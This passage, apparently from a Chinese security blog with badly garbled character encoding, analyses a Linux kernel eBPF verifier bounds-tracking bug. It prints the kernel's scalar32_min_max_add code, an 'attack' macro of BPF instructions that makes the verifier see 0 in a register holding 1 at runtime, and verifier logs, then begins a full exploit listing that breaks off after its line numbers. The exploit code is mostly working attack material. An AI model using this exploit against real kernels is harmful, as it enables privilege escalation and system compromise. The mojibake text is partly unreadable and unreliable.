class="keyword">void</span> <span class="title">scalar32_min_max_add</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">s32 smax_val = src_reg-&gt;s32_max_value;</span><br><span class="line">u32 umin_val = src_reg-&gt;u32_min_value;</span><br><span class="line">u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||</span><br><span class="line">    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value += smin_val;</span><br><span class="line">dst_reg-&gt;s32_max_value += smax_val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||</span><br><span class="line">    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value = <span class="number">0</span>;</span><br><span class="line">dst_reg-&gt;u32_max_value = U32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value += umin_val;</span><br><span class="line">dst_reg-&gt;u32_max_value += umax_val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ™ä¼šè¿›å…¥è¿™æ ·ä¸€ä¸ªå‡½æ•°ä¸­ï¼Œè®¡ç®—ä¸€ä¸‹ä¾¿ä¼šå‘ç°ä¸ä¼šå‡ºç°<code>overflow</code>çš„æƒ…å†µï¼Œæ‰€ä»¥èµ°çš„éƒ½æ˜¯elseï¼Œé‚£ä¹ˆåœ¨ç›¸åŠ ä¹‹å<code>dst_reg</code>çš„æœ€å¤§è¾¹ç•Œå€¼å’Œæœ€å°è¾¹ç•Œå€¼éƒ½ä¸º1äº†ã€‚æ­¤æ—¶å›åˆ°<code>adjust_scalar_min_max_vals</code>å‡½æ•°æ—¶åˆä¼šè°ƒç”¨<code>__reg_bound_offset</code>å‡½æ•°ï¼Œç„¶è€Œç»è¿‡è®¡ç®—å¯ä»¥å¾—åˆ°çš„æ˜¯ä»–ä¼šå°†å¯„å­˜å™¨çš„å€¼æ”¹ä¸º1ï¼Œé‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±ç®—æˆåŠŸè·å¾—äº†ä¸€ä¸ªåœ¨è¿è¡Œæ—¶å¯„å­˜å™¨çš„å€¼ä¸º0ä½†æ˜¯åœ¨<code>verifier</code>ä¸­è®¤å®šå…¶å€¼ä¸º1çš„å¯„å­˜å™¨äº†ã€‚</p><h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><p>ä¸éš¾çœ‹å‡ºæ¥ç›®å‰çš„æƒ…å†µå°±å¾ˆç±»ä¼¼d3bpfäº†ï¼Œä¸è¿‡ç¨æœ‰ä¸åŒçš„æ˜¯è¿™é‡Œè¿è¡Œæ—¶å’Œ<code>verifier</code>ä¸­çš„å€¼å’Œé¢˜ç›®ä¸­çš„æ­£å¥½ç›¸åï¼Œä¸è¿‡æƒ³è¦æ„é€ æˆä¸€æ‘¸ä¸€æ ·çš„ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼Œ<code>(reg + 1) &amp; 1</code>å³å¯æ„é€ å‡ºä¸€æ‘¸ä¸€æ ·çš„æƒ…å†µçš„äº†ã€‚</p><p>é¦–å…ˆé€šè¿‡ä¸Šè¿°åŠæ³•æ„é€ å‡ºæœ€å°è¾¹ç•Œå€¼ä¸º1ï¼Œæœ€å¤§è¾¹ç•Œå€¼ä¸º0çš„å¯„å­˜å™¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>: (<span class="number">5f</span>) r6 &amp;= r7</span><br><span class="line"><span class="number">20</span>: R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span>m</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ ¹æ®å‰é¢çš„ç†è®ºå¯ä»¥å¾—åˆ°ä¸€ä¸‹å†…å®¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span>: (<span class="number">79</span>) r3 = *(u64 *)(r8 +<span class="number">0</span>)</span><br><span class="line"> R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R1=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_winvP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: (b6) <span class="keyword">if</span> w3 &lt;= <span class="number">0x1</span> <span class="keyword">goto</span> pc+<span class="number">2</span> R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">537</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: (b7) r0 = <span class="number">1663106</span></span><br><span class="line"><span class="number">23</span>: R0_w=invP1663106 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ksm4,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">23</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line"><span class="number">24</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x10000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">24</span>: (<span class="number">0f</span>) r6 += r3</span><br><span class="line"><span class="number">25</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">1446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">25</span>: (<span class="number">07</span>) r6 += <span class="number">1</span></span><br><span class="line"><span class="number">26</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775806</span>,smax_value=<span class="number">223372032559808514</span>,umin_value=<span class="number">2</span>,umax_value=<span class="number">18446744069414584322</span>,var_off=(<span class="number">0x2</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">2</span>,s32_max_value=<span class="number">2</span>,u32_max_value=<span class="number">2</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R1</span><br><span class="line"><span class="number">26</span>: (<span class="number">57</span>) r6 &amp;= <span class="number">1</span></span><br><span class="line"><span class="number">27</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP0 R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,s=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">27</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¨å¾®æä¸€å˜´å°±æ˜¯è¿™é‡Œæ˜¯å¦‚ä½•ä½¿R3è¾¾åˆ°é«˜32ä½ä¸º<code>unknown</code>ï¼Œä½32ä¸º<code>known</code>çš„æ•ˆæœï¼Œå…¶å®ä¹Ÿå¾ˆå®¹æ˜“æƒ³æ˜ç™½ï¼Œè¿™é‡Œè¿›è¡Œäº†<code>unsigned</code>çš„å°äºç­‰äºçš„åˆ¤æ–­ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šä½32ä½çš„å€¼ï¼Œä¸è¿‡å› ä¸ºæ˜¯<code>&lt;= 1</code>æ‰€ä»¥æœ€åä¸€ä½ä¹Ÿæ˜¯æ— æ³•ç¡®å®šçš„ï¼Œæ‰€ä»¥æœ€ç»ˆ<code>.mask = 0xffffffff00000001</code>ï¼Œå½“ç„¶ç›´æ¥<code>AND 0xffffffff00000001</code>åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>æ­¤æ—¶å› ä¸ºé€šè¿‡è¾¹ç•Œå€¼ä¿®å¤äº†R6å¯„å­˜å™¨çš„<code>var_off</code>ä¸º1ï¼Œä½†æ˜¯è¿è¡Œæ—¶ä¾æ—§ä¸º0æ‰€ä»¥æ­¤æ—¶åªéœ€è¦å°†<code>R6 + 1</code>éšå<code>AND 1</code>é‚£ä¹ˆåœ¨<code>verifier</code>æ˜¯å°±ä¼šæ˜¾ç¤ºR6ä¸º0äº†ï¼Œè‡³æ­¤å¾—åˆ°äº†ä¸€ä¸ªè¿è¡Œæ—¶ä¸º1ï¼Œ<code>verifier</code>ä¸º0çš„å¯„å­˜å™¨äº†ã€‚</p><h3 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h3><p>å…·ä½“åˆ©ç”¨æ–¹æ³•å’Œd3bpfä¸€è‡´ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œæœ‰éœ€è¦å¯ä»¥å»çœ‹ <a href="https://cv196082.gitee.io/2023/01/06/d3bpf/">https://cv196082.gitee.io/2023/01/06/d3bpf/</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span 